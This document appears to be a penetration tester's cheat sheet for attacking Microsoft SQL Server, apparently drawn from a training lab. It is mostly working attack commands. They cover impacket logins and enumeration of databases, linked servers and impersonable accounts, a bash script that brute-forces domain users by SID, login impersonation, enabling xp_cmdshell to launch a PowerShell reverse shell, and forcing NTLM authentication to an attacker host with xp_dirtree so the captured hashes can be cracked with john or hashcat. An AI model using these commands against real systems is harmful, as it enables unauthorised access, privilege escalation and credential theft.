# Authentication

From Linux
```bash
# Auth
impacket-mssqlclient '<user>':'<pass>'@<ip_address> -port <port> -windows-auth

# Domain Auth (might not need)
impacket-mssqlclient <domain>/<user>:'<pass>'@<ip_address> -port <port> -windows-auth

# Error: [-] ERROR(DANTE-SQL01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
remove -windows-auth
```

From Windows
```cmd
sqlcmd /S <servername> /d <database> -U <user> -p <pass>
```

## Enumeration
Enumeration : see [[0 SQL Theory and Databases]] and PayloadAllTheThings
#### The Basics
```sql
-- Check Permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- View Databases:
SELECT name FROM sys.databases;
	-- Defaults:
		-- master
		-- tempdb
		-- model
		-- msdb

-- View Tables:
SELECT * FROM <database>.information_schema.tables;

-- View Entries in Tables:
SELECT * FROM <database>.<table_schema>.<table_name>;

-- mssqlclient.py specifics
enum_links        -- linked server login mappings
enum_logins       -- Check all logins on instance
enum_impersonate  -- Check users we can impersonate
```
#### Linked Servers
```sql
-- Checked for linked servers
EXEC sp_helplinkedsrvlogin;
	-- ALTERNATIVE : enum_links 
	-- make note of SRV_NAME
	-- IF Linked Server, Local Login, Is Self Mapping columns are blank, it likely uses a form of delegation for mapping (the sa)

-- Check is current user is admin on Linked server
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<SRV_NAME>];

-- Enumerate DBs on Linked Server
EXEC ('SELECT name FROM sys.databases') AT [<SRV_NAME>];
```
#### Manually Enumerate Domain Accounts
```sql
-- Confirm domain name
select DEFAULT_DOMAIN() as mydomain;

-- Capture Domain SID (binary SID in hex)
select SUSER_SID('<domain>\Domain Admins') -- First, grab SID of a default group
	-- Domain Admins SID:
	-- b'010500000000000515000000a185deefb22433798d8e847a00020000'
	
	-- Remove the RID:
	-- b'010500000000000515000000a185deefb22433798d8e847a'
	
	-- Domain SID base:
	-- 010500000000000515000000a185deefb22433798d8e847a

-- Example of using the domain sid to probe for a user from within MSSQL
select SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847aF4010000);
	-- F4010000 = 500 RID in decimel

-- Use the bash script below to brute force domain users
```

```bash
#!/bin/bash
# Replace SID_BASE, and RES (mssqlclient.py) commands as needed

SID_BASE="010500000000000515000000a185deefb22433798d8e847a"   # Replace

for RID in {1000..1500}; do
    HEX_RID=$(python -c "import struct; print(struct.pack('<I', ${RID}).hex())")
    SID="${SID_BASE}${HEX_RID}"
    RES=$(mssqlclient.py <username>:<password>@<target> -file <( echo "select SUSER_SNAME(0x${SID});") 2>&1 | sed -n '/^----/{n;p;}')
    echo -n $'\r'"${RID}: ${RES}"
    [[ "$(echo "$RES" | xargs)" != "NULL" ]] && echo
done
```
## User Impersonation

Impersonate users 
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  
	
	-- this will display user(s) we can impersonate
	-- ALTERNATIVE: enum_impersonate

EXECUTE AS LOGIN = '<user>'
```

## Command Execution

xp_cmdshell
```sql
-- Quick win (might now work)
enable_xp_cmdshell


-- Enabling xp_cmdshell (Manual)
SQL> EXECUTE sp_configure 'show advanced options', 1;
--[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;

SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
--[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;



-- Reverse shell
SQL> EXECUTE xp_cmdshell '<command(base64_powershell_revshell)>';
```

Other Techniques : For these two, see [[13 Microsoft SQL Server]] red teaming notes
	OLE Automation
	SQL Common Language Runtime 

## Capture sql_svc Net-NTLMv2 Hash
We can often do this as a low privileged user :)

If no interesting data exists in the database and you cannot run commands, no linked servers, etc... you can try and get MSSQL to connect to your host and authenticate, and capture the challenge / response of the sql service account

Net-NTLMv2 Hash Capture
```bash
sudo responder -I tun0

SQL> EXEC xp_dirtree '\\<attacker_ip>\share', 1, 1

# capture NTLMv2 hash
# crack with john or hashcat
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
or
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```